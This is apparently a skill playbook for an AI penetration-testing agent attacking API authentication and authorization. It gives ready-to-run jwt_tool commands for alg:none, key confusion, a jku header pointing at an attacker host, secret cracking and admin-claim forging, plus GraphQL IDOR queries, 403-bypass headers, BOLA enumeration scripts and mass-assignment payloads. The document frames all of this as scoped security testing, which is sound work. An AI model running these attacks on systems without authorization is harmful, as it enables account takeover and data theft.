# API Security Testing Attack Skill

Advanced API security workflow covering JWT exploitation (algorithm confusion, kid/jku/x5u header abuse, secret cracking, claim tampering), GraphQL attacks (introspection recovery, IDOR in queries and mutations, batching and alias abuse, filter bypass), and REST abuse (401/403 bypass, BOLA enumeration, mass assignment, API version drift). Use this skill when the target exposes a JSON/GraphQL/REST API and the task is authentication, authorization, or endpoint-level exploitation rather than a single injection class.

## When to Classify Here

Pick this skill when the request targets an API's auth or authorization surface, including:

- "Test the JWT for algorithm confusion and forge an admin token."
- "The GraphQL endpoint has introspection on, map it and find an IDOR mutation."
- "Bypass the 403 on `/api/admin` with header or path tricks."
- "Enumerate BOLA across `/api/users/{id}`."
- "Try mass assignment to set `role: admin` on the signup endpoint."
- "Find an older API version that skips the auth check."

Keywords: API security, JWT, JSON Web Token, alg none, RS256 to HS256, jku, x5u, kid injection, jwt_tool, GraphQL, introspection, graphql-cop, clairvoyance, BOLA, IDOR, broken object level authorization, mass assignment, 403 bypass, 401 bypass, X-Original-URL, X-Forwarded-For, HTTP method override, API versioning, OAuth redirect_uri, OWASP API Top 10.

### Disjoint from neighbouring skills

- vs. `sqli_exploitation` (community): this skill treats SQLi only as a transport (a GraphQL/REST field that feeds a query). When the core task is database extraction or a DBMS WAF bypass, hand off to `sqli_exploitation`.
- vs. `auth_session_attacks` (community): this skill owns the JWT token-crypto attacks (alg confusion, kid/jku/x5u, secret cracking). `auth_session_attacks` owns the OAuth/OIDC flow, session lifecycle (fixation, invalidation), and MFA bypass. When the request is "forge/crack the token", stay HERE; when it is "abuse the login flow / OAuth / MFA", go there. They cross-reference on JWT because OAuth often issues JWTs.
- vs. `idor_bola_exploitation` / `bfla_exploitation` (community, @samugit83): those are the deep, dedicated object-level and function-level authorization playbooks. This skill performs quick BOLA and version-drift checks as part of a broad API sweep; when the engagement is specifically a thorough object-level or function-level authz audit, prefer the dedicated skills. See also `broken_access_control` for the routing decision tree.
- vs. `mass_assignment` (community, @samugit83): this skill includes a mass-assignment quick check; the dedicated skill covers ownership takeover and billing tampering in depth.
- vs. `cve_exploit` (built-in): a named CVE in a specific API product belongs to `cve_exploit` when the user gives the CVE ID.

## Tools

- `query_graph` to inventory Endpoints, Parameters, detected API docs, and auth-related Headers for the target host.
- `execute_httpx` for probing API roots, doc endpoints, and response headers (Authorization, X-API-Key, Set-Cookie, WWW-Authenticate).
- `execute_ffuf` for endpoint, parameter, and API-version fuzzing.
- `execute_arjun` for hidden-parameter discovery on API routes.
- `execute_curl` for crafted single-shot requests: JWT replay, GraphQL queries, 403-bypass header/path variants.
- `execute_code` for custom exploit scripts: BOLA enumeration loops, JWT forging where `jwt_tool` lacks a mode, GraphQL batching generators.
- `kali_shell` for `jwt_tool`, `graphql-cop`, `graphqlmap`, `clairvoyance`, `websocat`, and `jq`.

### Captured-traffic workflow (proxy_brain tools)

When HTTP Traffic Capture is enabled, source this survey from recorded history. `redamon.sitemap()` lists observed endpoints; `redamon.search({"q":"graphql"})` and `redamon.grep("__schema")` find the GraphQL and API-doc surfaces. 401/403 bypass runs off one captured forbidden request: `redamon.replay(<403_txn>, {"headers":{"X-Original-URL":"/api/admin/users"}})`, then `{"headers":{"X-Forwarded-For":"127.0.0.1"}}`, then `{"headers":{"X-HTTP-Method-Override":"GET"}}`; `redamon.diff(<403_txn>, <replay_txn>)` shows the 403-to-200 flip. BOLA enumeration uses `redamon.fuzz(<captured_txn>, "id", ["1","2","100"])` for a query-parameter id (50 payloads max, origin host only). `redamon.params()` flags sequential-id, uuid, jwt, and base64 parameters to prioritize. Where the proxy stops: path-segment ids (`/api/users/1`) and version walks need iterated `redamon.replay` with `{"path":...}`, and cross-host probes need `execute_curl`.

## Workflow

Three phases. Phase 1 is non-destructive: map the API surface, pull docs/schema, and classify the auth model. Phase 2 attacks the token, the authorization boundary, and the endpoint protections. Phase 3 escalates proven access. If out-of-band callbacks are forbidden, confine proofs to inline responses and note the limitation.

### Phase 1: Reconnaissance and Surface Mapping (Informational)

1. **Inventory the API via `query_graph`**: ask "list all Endpoints and Parameters for the target host, plus Technology nodes naming an API framework or gateway, and any Header nodes mentioning Authorization or X-API-Key".

2. **Find docs and schema surfaces** with `execute_httpx` and `execute_ffuf`:
   ```
   execute_httpx> -l /tmp/urls.txt -path "/swagger.json,/openapi.json,/api-docs,/graphql,/v1/api-docs,/.well-known/openid-configuration" -mc 200 -silent
   execute_ffuf> -u https://target.tld/FUZZ -w /usr/share/seclists/Discovery/Web-Content/api/api-endpoints.txt -mc 200,201,301,302,401,403
   ```

3. **Classify the auth model** from a sample request: bearer JWT, opaque token, session cookie, or API key. For JWT, decode the token and note `alg`, `kid`, `jku`, `x5u`, and the claim set:
   ```
   kali_shell> jwt_tool <TOKEN>
   ```

4. **Pull the GraphQL schema** when a GraphQL endpoint exists. Try introspection first, then field suggestions, then clairvoyance:
   ```
   execute_curl> -X POST https://target.tld/graphql -H "Content-Type: application/json" -d '{"query":"{ __schema { queryType { name } mutationType { name } types { name kind fields { name } } } }"}'
   kali_shell> graphql-cop -t https://target.tld/graphql
   kali_shell> clairvoyance https://target.tld/graphql -o /tmp/schema.json -w /usr/share/seclists/Discovery/Web-Content/graphql-fields.txt
   ```

5. **Discover hidden parameters** on write endpoints with `execute_arjun` to seed the mass-assignment check in Phase 2.

6. **Map object-reference parameters** (`id`, `uuid`, `account`, `order`) and privileged endpoints (`/admin`, `/internal`) so Phase 2 BOLA and 403-bypass checks are targeted.

Once the API surface is mapped, the auth model is classified, and the token or schema is in hand, **request transition to exploitation phase**.

### Phase 2: Exploitation

Run the track that matches the Phase 1 findings, lowest impact first. Every track ends with a Validation step.

#### 2.A JWT attacks

1. **Full automated scan** to triage known flaws:
   ```
   kali_shell> jwt_tool <TOKEN> -M at
   ```
2. **alg:none** (signature stripping):
   ```
   kali_shell> jwt_tool <TOKEN> -X a
   ```
3. **RS256 to HS256 key confusion** (sign with the public key as the HMAC secret):
   ```
   execute_curl> -s https://target.tld/.well-known/jwks.json
   kali_shell> jwt_tool <TOKEN> -X k -pk /tmp/public.pem
   ```
4. **Header injection**: `jku`/`x5u` pointing at an attacker-hosted key set, embedded `jwk`, or `kid` path traversal / SQL injection:
   ```
   kali_shell> jwt_tool <TOKEN> -X s -ju https://attacker.tld/.well-known/jwks.json
   kali_shell> jwt_tool <TOKEN> -X i
   kali_shell> jwt_tool <TOKEN> -I -hc kid -hv "../../../../dev/null" -S hs256 -p ""
   ```
5. **Secret cracking** when HS256 with a weak key:
   ```
   kali_shell> jwt_tool <TOKEN> -C -d /usr/share/wordlists/rockyou.txt
   ```
6. **Claim tampering** once a signing path works (privilege escalation, user-id swap, expiry bypass):
   ```
   kali_shell> jwt_tool <TOKEN> -T -S hs256 -p "<secret>" -pc role -pv admin
   kali_shell> jwt_tool <TOKEN> -T -S hs256 -p "<secret>" -pc sub -pv "<admin_user_id>"
   ```
7. **Validation**: replay the forged token against a privileged endpoint and show the authorized response.

#### 2.B GraphQL attacks

1. **IDOR in queries and mutations**: request objects by guessed/incremented IDs, and invoke state-changing mutations with another user's object ID:
   ```graphql
   query { billingInvoice(id: "gid://app/BillingInvoice/2") { id amount customerEmail } }
   mutation { destroyConversation(input: { conversationId: "<other_user_id>" }) { success } }
   ```
2. **Introspection-disabled recovery**: field-suggestion probing ("Did you mean ...?") and clairvoyance (Phase 1). Bypass naive `__schema` regex blocks with whitespace: `{ __schema%0a{ types { name } } }`, GET instead of POST, or a WebSocket subscription channel.
3. **Batching and alias abuse** for rate-limit and brute-force amplification:
   ```graphql
   query { a1: user(id:1){email} a2: user(id:2){email} a3: user(id:3){email} }
   ```
4. **Injection transport**: if a field feeds a SQL query, confirm the oracle here, then hand off to `sqli_exploitation` for extraction.
5. **Validation**: show cross-tenant data returned or a mutation applied to an object the current user should not control.

#### 2.C REST 401/403 bypass

Run the bypass families against a known-forbidden endpoint with `execute_curl`:
1. **Routing-header trust**: `X-Original-URL: /admin`, `X-Rewrite-URL: /admin`.
2. **IP allowlist spoof**: `X-Forwarded-For: 127.0.0.1`, `X-Real-IP`, `X-Client-IP`, `Forwarded: for=127.0.0.1`.
3. **Path manipulation**: `/api/admin/..;/`, `//users`, `/./users`, `/users%2f`, `/users..;/`, trailing `/`, `;.css`.
4. **Case and encoding**: `/ADMIN/`, `/%61dmin/`, `/%2561dmin/`, Unicode homoglyphs.
5. **Method override**: `X-HTTP-Method-Override: GET` on a POST, and sweep all verbs:
   ```
   execute_code> language="python", code: """
   import requests
   for m in ['GET','POST','PUT','DELETE','PATCH','OPTIONS','HEAD','TRACE']:
       r=requests.request(m,'https://target.tld/api/admin',timeout=10,verify=False)
       print(m, r.status_code, len(r.content))
   """
   ```
6. **Validation**: a 403-to-200 flip returning privileged content, with the exact request that achieved it.

#### 2.D BOLA / IDOR and mass assignment (quick checks)

1. **BOLA enumeration** across object references with two identities where possible:
   ```
   execute_code> language="python", code: """
   import requests
   h={'Authorization':'Bearer <LOW_PRIV_TOKEN>'}
   for i in range(1,101):
       r=requests.get(f'https://target.tld/api/users/{i}',headers=h,timeout=10,verify=False)
       if r.status_code==200: print(i, r.text[:120])
   """
   ```
2. **Mass assignment**: add privileged fields to a create/update body and check whether they stick:
   ```
   execute_curl> -X POST https://target.tld/api/users -H "Content-Type: application/json" -d '{"username":"t","email":"t@t.tld","role":"admin","isAdmin":true,"verified":true}'
   ```
3. **API version drift**: fuzz `/api/vN/` and compare auth enforcement across versions.
4. For a deep audit of any of these, hand off to the dedicated `idor_bola_exploitation`, `bfla_exploitation`, or `mass_assignment` skills.
5. **Validation**: cross-user data returned, or a privileged field accepted that the user should not be able to set.

### Phase 3: Post-Exploitation

Escalate proven access to demonstrate blast radius, within scope.

1. **Scope the compromise**: with a forged admin JWT or a working BOLA, enumerate what the elevated identity can read and change (user list, billing, config).
2. **Secret discovery**: hunt for leaked keys in JS bundles and exposed config, which may unlock further APIs:
   ```
   execute_curl> -s https://target.tld/main.js
   ```
   Grep for `api[_-]?key`, `secret`, `token`, `bearer`; check `/.env`, `/config.json`, and source maps (`main.js.map`).
3. **Chain to other classes**: a writable field reaching a template (SSTI), a query (SQLi), or a file sink (upload) hands off to the matching skill.
4. **Validation**: tie each escalation to a concrete, reversible proof (a created test record, a read of a privileged object) with a unique marker.

## Reporting Guidelines

Each finding must include:

- **Class**: JWT (which attack), GraphQL (IDOR/introspection/batching), REST 403-bypass, BOLA, mass assignment, or version drift.
- **Endpoint**: full URL and method, plus the auth model in play.
- **Working exploit**: a copy-paste `execute_curl` or `jwt_tool` command that reproduces the issue.
- **Proof**: the forged token and the privileged response it unlocked, the cross-tenant data returned, or the accepted privileged field.
- **Impact**: authentication bypass, horizontal or vertical privilege escalation, data exposure, or account takeover.
- **CVSS**: typically 9.8 for an unauthenticated auth bypass, 8.x for authenticated privilege escalation, lower for info disclosure.
- **OWASP API Top 10 mapping**: API1 BOLA, API2 Broken Authentication, API3 Broken Object Property, API5 BFLA, API8 Misconfiguration, API9 Inventory.
- **Remediation**: verify the expected `alg` and issuer, rotate weak secrets, disable introspection in production, enforce object-level authorization server-side, allowlist assignable fields, and retire old API versions.
- **References**: PortSwigger API testing and JWT labs, the OWASP API Security Top 10 (2023), HackTricks JWT and GraphQL pages.

## Important Notes

- **Verify the token path before forging claims.** Establish which signing/verification weakness the server actually accepts (alg:none, key confusion, weak secret) before tampering claims; forging claims on a token the server still validates correctly wastes requests.
- **Engagement scope.** Stop at a single proof per class on an informational engagement. Do not enumerate full user tables via BOLA or create persistent admin accounts without explicit written authorization.
- **BOLA needs two identities.** A 200 on `/api/users/2` only proves BOLA if account A should not see account B. Confirm the ownership boundary with a second test identity before reporting.
- **GraphQL batching can cause load.** Alias and batch amplification can degrade the target; cap the batch size and avoid deep-nesting denial-of-service payloads unless resource-exhaustion testing is explicitly in scope.
- **Hand off specialized depth.** Deep object-level authz goes to `idor_bola_exploitation`, function-level to `bfla_exploitation`, mass assignment to `mass_assignment`, SQLi extraction to `sqli_exploitation`, and OAuth/session/MFA to `auth_session_attacks`.
- **OOB-blocked environments.** If the target cannot reach an external collector, confine JWT/GraphQL proofs to inline responses and note the limitation.
- **CVE handoff.** A named CVE in a specific API product belongs to `cve_exploit` when the user gives the CVE ID.
- **No em dashes** anywhere in artifacts that flow into the report. Use hyphens.
